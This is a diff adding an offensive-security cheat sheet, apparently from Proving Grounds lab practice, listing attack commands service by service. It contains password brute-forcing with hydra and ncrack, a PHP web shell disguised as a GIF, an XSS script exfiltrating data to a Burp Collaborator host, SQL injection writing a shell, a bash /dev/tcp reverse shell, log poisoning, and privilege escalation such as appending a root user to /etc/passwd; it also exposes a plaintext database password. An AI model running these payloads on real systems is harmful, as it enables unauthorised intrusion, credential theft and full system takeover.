@@ -1,0 +1,178 @@
+FTP
+Anonymous login
+Crack FTP Passwd
+hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.217.56
+
+SSH
+Brute force credentials
+ncrack -vvv ssh://192.168.213.125:43022 -U users -P passwords
+ncrack $IP -U users -P passwords -p ssh -f -v
+hydra -l gaara -P /usr/share/wordlists/rockyou.txt -t 40 ssh://192.168.198.142
+
+SSH Connect to diff port
+ssh -p 43022 dademola@192.168.213.125
+
+Connect to SSH without bash profile
+ssh 296640a3b825115a47b68fc44501c828@192.168.240.85 -t "bash --noprofile"
+
+SMTP
+smtp-user-enum -U team.txt -t 192.168.228.137/domain
+
+Check Mailbox
+curl -k 'imaps://postfish.off/INBOX;MAILINDEX=1' --user sales:sales
+
+Connect to mail server
+nc -nv 192.168.209.137 25
+For more: https://thevillagehacker.com/writeup/2024/05/20/Proving_Grounds_Practice_Potfish.html
+
+SMB
+Share scan
+smb-enum-shares
+smb-security-mode
+smb-enum-users
+smb-vuln-ms17-010
+
+List share
+smbclient -L //192.168.201.117/ -N
+
+Connect and list files
+smbclient //192.168.201.64/<shareName> -N
+
+Rsync Scan
+nmap -sV --script "rsync-list-modules" -p 873 192.168.195.126
+
+Rsync Enumeration
+rsync -av --list-only rsync://192.168.195.126/
+rsync -av --list-only rsync://192.168.195.126/folder
+
+Upload ssh dir
+rsync -av .ssh/ rsync://fox@192.168.195.126/fox/.ssh
+
+Web App
+Custom wordlist based on text in web page
+cewl http://postfish.off/team.html -m 5 -w team.txt
+
+Reverse Shell Upload
+GIF98;
+<?php
+echo "<pre>";
+system($_GET['cmd']);
+echo "</pre>";
+?>
+
+Drupal Exploit
+https://www.exploit-db.com/exploits/44449
+>use exploit/unix/webapp/drupal_drupalgeddon2
+
+WPScan
+wpscan --url http://192.168.169.50/wordpress/ --enumerate u --enumerate p --enumerate t
+Bruteforce credentials
+wpscan --url https://192.168.211.148:12380/blogblog/ --disable-tls-checks -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
+Wordpress Plugin Advance Video Exploit: https://www.exploit-db.com/exploits/39646
+
+Send POST req with curl
+curl -X POST --data "code=4*4" http://192.168.201.117:50000/verify
+
+Exfil datausing js
+<script>
+var req = new XMLHttpRequest();
+req.open(“GET”, “http://localhost:5000/admin", true);
+req.onreadystatechange = exfil;
+req.send();
+function exfil(){
+ location = “http://zdg8qpo8j2mvfca9lh6jx7dzkqqie7.burpcollaborator.net/?resp=" + encodeURIComponent(req.responseText);
+};
+</script>
+
+
+Inject RCE Code via SQLi
+' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/srv/http/rce.php" -- 
+
+Create password Hash
+openssl passwd -1 -salt ignite pass123
+/bin/echo "{md5}"`/bin/echo -n "password" | openssl dgst -binary -md5 | openssl enc -base64`
+
+Python3 Extended Capabilities Exploit
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+Crack zip file password
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt save.zip
+
+Connect to DB using MySQL
+mysql -uroot -pEscalateRaftHubris123
+
+MySQL cli commands
+show database
+use database
+show tables
+select * from tables
+
+Reverse Shell
+#!bin/bash
+bash -c 'sh -i >& /dev/tcp/192.168.45.218/22 0>&1'
+More: https://www.revshells.com/
+
+FreeBSD identd
+ident-user-enum 192.168.196.60 113 22 10000
+
+Spawn Shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+PostgreSQL DB Connect
+psql -U postgres -h 192.168.156.47 -p 5437
+RCE Exploit: https://github.com/kashif-23/modified-public-exploits/blob/main/postgresqlversions_9.3-11.7-RCE.py
+
+Connect to Redis server
+redis-cli -h 192.168.211.69
+Redis RCE Exploit: 
+https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#redis-rce
+https://github.com/n0b0dyCN/redis-rogue-server
+
+After Shell
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
+export TERM=xterm-256color
+alias ll='ls -lsaht --color=auto'
+
+SSH Log Poisoning
+naveenj/<?php system($_GET['cmd']); ?>
+Trigger Shell
+curl "http://192.168.151.80/console/file.php?file=../../../../../../../../../../var/log/auth.log&cmd=whoami"
+
+Netcat File Transfer
+nc 192.168.45.204 1233 < apache2.conf #send
+nc -lvnp 1233 >apache2.conf   #receive
+
+Restart Apache
+sudo /bin/systemctl restart apache2
+
+Privilege Escalation
+pwnkit
+https://github.com/joeammond/CVE-2021-4034
+dirtycow 2 exploit
+https://www.exploit-db.com/exploits/40839
+
+List Extended Capabilities
+getcap -r / 2> /dev/null
+
+MySQL Privilege Escalation
+https://thevillagehacker.com/writeup/2024/01/15/Proving_Grounds_Practice_Banzai.html
+
+Enumerate SUID
+find / -perm -u=s -type f 2>/dev/null
+
+Fail2ban
+https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7
+
+Set SUID bit to binary
+cp /bin/dash /tmp/dash; chmod u+s /tmp/dash;
+./dash -p
+
+Chrootki Local Privilege Escalation
+https://www.exploit-db.com/exploits/33899
+
+NMAP Local PE
+echo 'os.execute("/bin/bash")' > script.nse
+sudo /usr/bin/nmap --script=script.nse
+
+Write new user to /etc/passwd
+echo "hacker:bWBoOyE1sFaiQ:0:0:root:/root:/bin/bash" >> /etc/passwd
